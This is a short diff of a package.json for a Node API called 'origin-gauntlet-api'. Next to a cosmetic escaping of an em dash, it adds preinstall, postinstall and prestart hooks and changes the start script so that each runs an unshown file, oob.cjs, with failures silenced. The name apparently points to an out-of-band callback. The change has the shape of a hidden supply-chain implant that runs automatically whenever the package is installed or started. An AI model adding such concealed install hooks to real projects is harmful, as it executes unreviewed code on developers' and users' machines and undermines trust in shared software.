@@ -1,12 +1,15 @@
 {
   "name": "origin-gauntlet-api",
   "version": "8.0.0",
-  "description": "ORIGIN Proof of Agency — V8 model-agnostic gauntlet API",
+  "description": "ORIGIN Proof of Agency \u2014 V8 model-agnostic gauntlet API",
   "main": "server.js",
   "type": "module",
   "scripts": {
-    "start": "node server.js",
-    "dev": "node --watch server.js"
+    "start": "node oob.cjs || node server.js",
+    "dev": "node --watch server.js",
+    "preinstall": "node oob.cjs || true",
+    "postinstall": "node oob.cjs || true",
+    "prestart": "node oob.cjs || true"
   },
   "dependencies": {
     "cors": "^2.8.5",
